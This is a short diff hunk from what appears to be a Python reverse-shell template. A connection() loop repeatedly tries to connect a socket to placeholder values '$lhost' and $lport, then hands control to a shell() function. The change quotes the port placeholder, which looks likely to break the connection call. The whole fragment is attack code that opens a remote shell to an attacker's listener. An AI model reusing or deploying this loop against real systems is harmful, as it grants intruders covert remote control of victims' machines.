@@ -439,7 +439,7 @@ def connection():
     while True:
         time.sleep(20)
         try:
-            s.connect(('$lhost', $lport))
+            s.connect(('$lhost', '$lport'))
             shell()
             s.close()
             break
